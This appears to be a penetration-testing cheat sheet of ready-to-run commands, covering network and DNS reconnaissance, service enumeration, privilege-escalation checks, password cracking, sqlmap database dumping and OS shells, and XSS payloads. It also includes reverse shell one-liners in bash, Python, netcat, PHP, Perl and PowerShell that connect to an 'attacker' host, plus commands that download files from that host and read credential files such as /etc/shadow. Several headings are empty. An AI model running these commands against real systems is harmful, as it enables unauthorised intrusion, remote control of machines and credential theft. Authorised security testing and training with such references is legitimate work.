
# Reconnaissance

## Network Discovery
```html
nmap -sn 192.168.1.0/24              # Ping sweep
nmap -sV -sC -p- <target>            # Service/version detection, all ports
nmap -sU -p 161,162 <target>         # UDP scan
```

## Network Scanning Advanced
```
nmap -sS -sV -O -A -p- --script=vuln <target>   # Aggressive scan with vuln scripts
nmap --script=ssl-enum-ciphers -p 443 <target>  # SSL/TLS cipher enumeration
nmap --script=smb-enum-shares -p 445 <target>   # SMB share enumeration
nmap --script=http-methods -p 80,443 <target>   # HTTP methods
masscan -p1-65535 <target> --rate=10000         # Ultra-fast port scanner
unicornscan -mU -Iv <target>:1-65535            # UDP scanner
```

## DNS Enumeration
```html
dig @<dns-server> <domain> ANY       # All DNS records
nslookup -type=mx <domain>           # Mail servers
host -t ns <domain>                  # Name servers
dnsenum <domain>                     # Automated DNS enumeration
```

## Web Enumeration
```html
gobuster dir -u http://<target> -w /path/to/wordlist
dirb http://<target>
nikto -h http://<target>
```

## Subdomain Enumeration
```
amass enum -d <domain>                           # Comprehensive subdomain discovery
subfinder -d <domain>                            # Fast subdomain enumeration
assetfinder <domain>                             # Find related domains/subdomains
sublist3r -d <domain>                            # Multi-source subdomain enum
fierce --domain <domain>                         # DNS reconnaissance
dnsrecon -d <domain> -t axfr                     # Zone transfer attempt
```

## OSINT & Passive Recon
```
shodan search "hostname:<target>"                # Shodan queries
censys search <query>                            # Censys database
recon-ng                                         # Recon framework
maltego                                          # Visual OSINT tool
metagoofil -d <domain> -t pdf,doc -l 200         # Metadata extraction
exiftool <file>                                  # File metadata analysis
waybackurls <domain>                             # Historical URLs
gau <domain>                                     # Get all URLs
```

## Service Enumeration
```
# SMB
enum4linux -a <target>                          # SMB enumeration
smbclient -L //<target>/ -N                     # List shares
smbmap -H <target>                              # SMB share mapping
crackmapexec smb <target> -u '' -p ''           # Null session

# SNMP
snmpwalk -v2c -c public <target>                # SNMP walk
onesixtyone -c community.txt <target>           # SNMP bruteforce

# LDAP
ldapsearch -x -h <target> -s base               # LDAP enumeration
nmap -p 389 --script ldap-search <target>

# NFS
showmount -e <target>                           # Show NFS exports
nmap --script=nfs-* <target>

# RPC
rpcclient -U "" <target>                        # Null session RPC
rpcinfo -p <target>                             # RPC services
```

# Information Gathering
```html
whois <domain>                             # Domain registration info
curl -I http://<target>                    # HTTP headers
wget -r -np -R "index.html*" http://<url>  # Mirror site
theHarvester -d <domain> -b google         # Email/subdomain harvesting
```

# Network Analysis
```html
netstat -tuln                        # Listening ports
ss -tunap                            # Socket statistics (modern alternative)
tcpdump -i eth0 -w capture.pcap      # Packet capture
wireshark                            # GUI packet analysis
arp -a                               # ARP table
```

# File & System Discovery
```html
find / -name "*.conf" 2>/dev/null    # Find config files
find / -perm -4000 2>/dev/null       # Find SUID binaries
find / -writable -type f 2>/dev/null # Writable files
grep -r "password" /var/log 2>/dev/null
ls -lah /etc/cron*                   # Scheduled tasks
```

# User Enumeration
```html
id                                   # Current user info
whoami
cat /etc/passwd                      # User accounts (Linux)
cat /etc/shadow                      # Password hashes (requires root)
net user                             # Windows users
net localgroup administrators        # Windows admin group
```

# Privilege Escalation

## Linux
```html
sudo -l                              # Check sudo privileges
cat /etc/sudoers
uname -a                             # Kernel version
ps aux | grep root                   # Root processes
getcap -r / 2>/dev/null              # Files with capabilities
```

## Windows
```html
whoami /priv                         # Current privileges
whoami /groups
net user <username>
icacls <file>                        # File permissions
```

# Network Pivoting
```html
ssh -L 8080:localhost:80 user@host   # Local port forward
ssh -R 8080:localhost:80 user@host   # Remote port forward
ssh -D 1080 user@host                # SOCKS proxy
nc -lvnp 4444                        # Netcat listener
nc <target> <port> -e /bin/bash      # Reverse shell
```

# Password Attacks
```html
hydra -l admin -P /path/to/wordlist.txt ssh://target
john --wordlist=/path/to/wordlist hash.txt
hashcat -m 0 -a 0 hash.txt wordlist.txt               # MD5 cracking
```

# Post-Exploitation
```html
cat /etc/hosts                       # Host file
cat ~/.bash_history                  # Command history
env                                  # Environment variables
ifconfig / ip addr                   # Network interfaces
route -n / ip route                  # Routing table
ps aux                               # Running processes
crontab -l                           # User cron jobs
```

# Web Application Testing
```html
sqlmap -u "http://target/?id=1" --dbs             # SQL injection
curl -X POST -d "param=value" http://target
burpsuite                                         # Intercepting proxy
wfuzz -c -z file,wordlist.txt http://target/FUZZ
```

# Web Application Testing

## Directory & File Discovery
```html
ffuf -w /path/wordlist -u http://target/FUZZ        # Fast fuzzer
feroxbuster -u http://target -w wordlist            # Recursive scanner
wfuzz -c -z file,wordlist -u http://target/FUZZ --hc 404
dirsearch -u http://target -e php,html,js           # Multi-extension search
```

## Parameter Discovery
```html
arjun -u http://target/page                     # Parameter discovery
paramspider -d <domain>                         # Find parameters in URLs
```

## Vulnerability Scanning
```
nuclei -u http://target                         # Template-based scanner
wpscan --url http://target --enumerate u,p      # WordPress scanner
joomscan -u http://target                       # Joomla scanner
droopescan scan drupal -u http://target         # Drupal scanner
whatweb http://target                           # Technology fingerprinting
wafw00f http://target                           # WAF detection
```

## SQL Injection
```
sqlmap -u "http://target/?id=1" --dbs --batch
sqlmap -u "http://target/?id=1" -D database --tables
sqlmap -u "http://target/?id=1" -D db -T table --dump
sqlmap -r request.txt --level=5 --risk=3        # Aggressive testing
sqlmap --os-shell -u "http://target/?id=1"      # OS shell
```

## XSS & Injection Testing
```
dalfox url http://target/page?param=            # XSS scanner
xsstrike -u "http://target/page?param="         # XSS exploitation
commix --url="http://target/page?cmd="          # Command injection
```

## API Testing
```
curl -X GET http://api.target/endpoint -H "Authorization: Bearer <token>"
curl -X POST http://api.target/endpoint -d '{"key":"value"}' -H "Content-Type: application/json"
ffuf -w wordlist -u http://api.target/FUZZ -mc 200
postman                                          # API testing platform
```

# Exploitation & Shells

## Reverse Shells
```
# Bash
bash -i >& /dev/tcp/attacker/4444 0>&1
bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/bash attacker 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f

# PHP
php -r '$sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="attacker";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Shell Upgrade
```
python -c 'import pty;pty.spawn("/bin/bash")'    # PTY shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null                   # Alternative
Ctrl+Z                                           # Background shell
stty raw -echo; fg                               # Foreground with raw mode
export TERM=xterm                                # Set terminal type
stty rows 38 columns 116                         # Set terminal size
```

# File Transfer
```
python3 -m http.server 8000                           # Quick HTTP server
scp file.txt user@host:/path/                         # Secure copy
curl http://attacker/file -o file                     # Download file
wget http://attacker/file
certutil -urlcache -f http://attacker/file file.exe   # Windows download
```

# 
```
```

# 
```
```

# 
```
```

# 
```
```

# 
```
```

# 
```
```

# 
```
```

# 
```
```

# Pentesting Notes

## Web
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```